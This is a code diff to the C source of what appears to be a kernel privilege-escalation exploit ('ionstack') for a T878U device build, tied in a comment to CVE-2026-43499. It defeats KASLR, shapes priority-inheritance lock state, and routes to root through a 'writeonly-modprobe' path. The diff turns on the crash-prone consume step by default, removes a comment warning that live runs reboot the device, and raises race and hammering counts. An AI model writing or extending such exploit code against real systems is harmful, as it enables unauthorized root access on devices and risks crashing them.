@@ -980,6 +980,7 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
   const char *page_observe_log = getenv("IONSTACK_PAGE_OBSERVE_LOG");
   const char *effective_owner_mode =
       effective_t878u_lock_owner_mode(fops_lock_owner_mode);
+  (void)effective_owner_mode;
   struct env_pair environment[64];
   size_t env_count = 0;
   snprintf(base_value, sizeof(base_value), "0x%016" PRIx64, kaslr_base);
@@ -1021,16 +1022,16 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
       {"IONSTACK_FOPS_PI_NODE_SAFE",
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
-       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "default"},
-      {"IONSTACK_FOPS_LOCK_OWNER_MODE", effective_owner_mode},
+       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
+      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "none"},
+      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI", "1"},
       {"IONSTACK_FOPS_LOCK_WAITERS",
        fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
       {"IONSTACK_FOPS_WAIT_LOCK_WORD",
        fops_wait_lock_word && *fops_wait_lock_word ? fops_wait_lock_word
                                                    : "0"},
       {"IONSTACK_FOPS_WAITER_PRIO",
-       fops_waiter_prio && *fops_waiter_prio ? fops_waiter_prio
-                                             : LEGACY_CHAINWALK_WAITER_PRIO},
+       fops_waiter_prio && *fops_waiter_prio ? fops_waiter_prio : "0"},
       {"IONSTACK_FOPS_WAITER_TASK_MODE",
        fops_waiter_task_mode && *fops_waiter_task_mode
            ? fops_waiter_task_mode
@@ -1100,6 +1101,7 @@ static int __attribute__((unused)) spawn_capture(struct child_proc *child, unsig
       getenv("IONSTACK_FOPS_WAITER_TASK_MODE");
   const char *effective_owner_mode =
       effective_t878u_lock_owner_mode(fops_lock_owner_mode);
+  (void)effective_owner_mode;
   struct env_pair environment[26];
   size_t env_count = 0;
   snprintf(lock_value, sizeof(lock_value), "0x%016" PRIx64, helper->fake_lock);
@@ -1174,7 +1176,7 @@ static int __attribute__((unused)) spawn_capture(struct child_proc *child, unsig
         fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"};
     environment[env_count++] = (struct env_pair){
         "IONSTACK_EXPECT_FOPS_PI_RB_SHAPE",
-        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "default"};
+        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"};
     environment[env_count++] = (struct env_pair){
         "IONSTACK_EXPECT_FOPS_LOCK_OWNER_MODE", effective_owner_mode};
     environment[env_count++] = (struct env_pair){
@@ -1985,36 +1987,30 @@ static int spawn_pselect_root(struct child_proc *child,
   const char *fops_wait_lock_word = getenv("IONSTACK_FOPS_WAIT_LOCK_WORD");
   const char *effective_owner_mode =
       effective_t878u_lock_owner_mode(fops_lock_owner_mode);
+  (void)effective_owner_mode;
+  /*
+   * Res-race installer path (CVE-2026-43499 dangling pi_blocked_on):
+   * default to arming sched_setattr consumption.  Set
+   * IONSTACK_SKIP_CONSUME=1 for survival-only zeroing runs.
+   */
   const char *skip_consume =
       skip_override && *skip_override
           ? skip_override
           : (unsafe_consume && *unsafe_consume &&
-                     strcmp(unsafe_consume, "0") != 0
-                 ? "0"
-                 : "1");
-  /*
-   * In-process T878U path: prepare + pselect + writeonly modprobe in one
-   * process.  Use the same reclaim shape that the holder already proved can
-   * reach hold-ready on this build (large posttarget search, relaxed
-   * order3/content gates).
-   */
-  /*
-   * Content-gated install path:
-   * - order-3 fragment send + splice hold + content match required
-   * - dead PFN/order3 counters no longer soft-pass page-ready
-   * - T878U pselect is stack-safe only at nfds<=320, but live tests still
-   *   reboot as soon as sched_setattr consumes the stale waiter.
-   * Default to survival-only; set IONSTACK_ALLOW_UNSAFE_CONSUME=1 only for a
-   * single diagnostic run when a recovery path is ready.
-   */
+                     strcmp(unsafe_consume, "0") == 0
+                 ? "1"
+                 : "0");
   struct env_pair environment[] = {
       {"IONSTACK_STAGE", "t878u-pselect-root"},
       {"IONSTACK_CFI_ROUTE", "writeonly-modprobe"},
       {"IONSTACK_KASLR_BASE", kaslr_value},
       {"IONSTACK_SKIP_CONSUME", skip_consume},
-      {"IONSTACK_PSELECT_ROUTE_ATTEMPTS", "1"},
-      {"IONSTACK_CONSUMER_MAX_CALLS", "1"},
-      {"IONSTACK_CONSUMER_BURST_CALLS", "1"},
+      {"IONSTACK_PSELECT_ROUTE_ATTEMPTS", "4"},
+      {"IONSTACK_PSELECT_HAMMER", "512"},
+      {"IONSTACK_PSELECT_DELAY_US", "0"},
+      {"IONSTACK_CONSUMER_MAX_CALLS", "128"},
+      {"IONSTACK_CONSUMER_BURST_CALLS", "32"},
+      {"IONSTACK_CONSUMER_STABLE_NICE", "1"},
       {"IONSTACK_PAGE_SETUP_ATTEMPTS", "96"},
       {"IONSTACK_KS_COLLISIONS", "8"},
       {"IONSTACK_KS_THREADS", "8"},
@@ -2040,8 +2036,9 @@ static int spawn_pselect_root(struct child_proc *child,
       {"IONSTACK_FOPS_PI_NODE_SAFE",
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
-       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "default"},
-      {"IONSTACK_FOPS_LOCK_OWNER_MODE", effective_owner_mode},
+       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
+      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "none"},
+      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI", "1"},
       {"IONSTACK_FOPS_LOCK_WAITERS",
        fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
       {"IONSTACK_FOPS_WAIT_LOCK_WORD",
